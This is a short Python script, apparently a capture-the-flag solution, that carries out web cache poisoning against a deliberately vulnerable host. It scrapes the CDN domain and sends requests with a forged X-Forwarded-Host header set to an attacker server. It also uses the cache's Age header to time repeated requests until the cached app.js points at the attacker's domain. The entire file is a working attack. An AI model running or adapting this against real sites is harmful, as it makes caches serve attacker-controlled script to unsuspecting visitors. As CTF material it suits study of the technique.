#!/usr/bin/env python
import requests
import re
import logging
import threading
import IPython
logging.basicConfig(level=logging.DEBUG)
l = logging.getLogger(__name__)

s = requests.Session()
ip = 'server_ip'
timeout = 120


def get_domain():
    r = s.get('http://app.hm.vulnerable.services/')
    url = re.findall(r'data-cdn=\"(.*)\"', r.content)[0]
    l.debug(url)
    return url


def req(cdn_domain):
    s.headers.update({'X-Forwarded-Host' : ip})
    r = s.get('http://{}/cdn/app.js'.format(cdn_domain))
    domain = re.findall(r'//([a-z0-9.]*)/', r.content)[0]
    time = r.headers['Age']
    delta = abs(timeout - int(time))
    return domain, delta


def main(cdn_domain):
    while True:
        domain, _ = req(cdn_domain)
        if domain == ip:
            l.debug('caching done!')
            break

if __name__ == '__main__':
    cdn_domain = get_domain()
    _, delta = req(cdn_domain)
    l.debug('start cache poisoning in %s sec' % delta)
    threading.Timer(delta, main, [cdn_domain]).start()
